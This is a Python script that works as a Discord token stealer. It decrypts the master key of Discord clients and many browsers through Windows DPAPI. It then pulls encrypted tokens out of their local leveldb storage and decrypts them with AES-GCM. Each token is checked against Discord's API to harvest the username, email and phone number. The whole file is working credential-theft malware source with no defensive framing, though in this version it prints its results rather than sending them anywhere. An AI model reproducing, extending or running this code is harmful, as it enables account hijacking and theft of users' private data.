import os
import re
import requests
import ntpath
from base64 import b64decode
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
import json

appdata = os.getenv("localappdata")
roaming = os.getenv("appdata")
chrome_user_data = ntpath.join(
    appdata, 'Google', 'Chrome', 'User Data')

paths = {
    'Discord': roaming + '\\discord\\Local Storage\\leveldb\\',
    'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\',
    'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\',
    'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb\\',
    'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
    'Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
    'Amigo': appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
    'Torch': appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
    'Kometa': appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
    'Orbitum': appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
    'CentBrowser': appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
    '7Star': appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
    'Sputnik': appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
    'Vivaldi': appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
    'Chrome SxS': appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
    'Chrome': chrome_user_data + '\\Default\\Local Storage\\leveldb\\',
    'Epic Privacy Browser': appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
    'Microsoft Edge': appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
    'Uran': appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
    'Yandex': appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
    'Brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
    'Iridium': appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
}

encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"


def win_decrypt(encrypted_str: bytes) -> str:
    return CryptUnprotectData(encrypted_str, None, None, None, 0)[1]


def get_master_key(path: str or os.PathLike):
    if not ntpath.exists(path):
        return None
    with open(path, "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    try:
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        return win_decrypt(master_key[5:])
    except KeyError:
        return None


def decrypt_val(buff, master_key) -> str:
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception:
        return f'Failed to decrypt "{str(buff)}" | key: "{str(master_key)}"'


def checkToken(token):
    headers = {
        'content-type': 'application/json',
        'Authorization': f'{token}'
    }

    req = requests.get(
        f'https://discord.com/api/v10/users/@me', headers=headers)

    if req.status_code == 200:
        data = json.loads(req.text)
        return {
            'username': data["username"],
            'userID': data['id'],
            'avatarURL': f'https://cdn.discordapp.com/avatars/{data["id"]}/{data["avatar"]}.png',
            'discriminator': data['discriminator'],
            'bio': data.get('bio', ''),  # Use .get() to handle missing keys
            # Use .get() to handle missing keys
            'email': data.get('email', ''),
            'phone': data.get('phone', '')  # Use .get() to handle missing keys
        }
    else:
        return 'Bad'


def getTokens():
    tokens = set()

    for name, path in paths.items():
        disc = name.replace(" ", "").lower()

        if "cord" in path and os.path.exists(os.path.join(roaming, disc, "Local State")):
            processed_tokens = set()  # Keep track of processed tokens for each path
            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]:
                    continue
                for line in [x.strip() for x in open(os.path.join(path, file_name), errors='ignore').readlines() if x.strip()]:
                    for y in re.findall(encrypted_regex, line):
                        token = decrypt_val(b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(
                            os.path.join(roaming, disc, "Local State")))
                        if token and token not in processed_tokens:
                            data = checkToken(token)
                            if isinstance(data, dict):  # check if the result is a dictionary
                                # Add token to the data dictionary
                                data['token'] = token
                                tokens.add(tuple(data.items()))
                                # Mark token as processed
                                processed_tokens.add(token)

    return orgnizeData(list(tokens))


def orgnizeData(tokens):
    returnl = []
    for i, item in enumerate(tokens):
        username = item[0][1]
        userID = item[1][1]
        avatarURL = item[2][1]
        discriminator = item[3][1]
        bio = item[4][1]
        email = item[5][1]
        phone = item[6][1]
        token = item[7][1]
        returnl.append(
            {'username': username, 'userID': userID, 'avatarURL': avatarURL, 'discriminator': discriminator, 'bio': bio, 'email': email, 'phone': phone, 'token': token})
    return returnl


if __name__ == '__main__':
    tokens = getTokens()
    for i, token in enumerate(tokens):
        print(
            f'{i+1}. {token["token"]} - {token["username"]} - {token["email"]}')
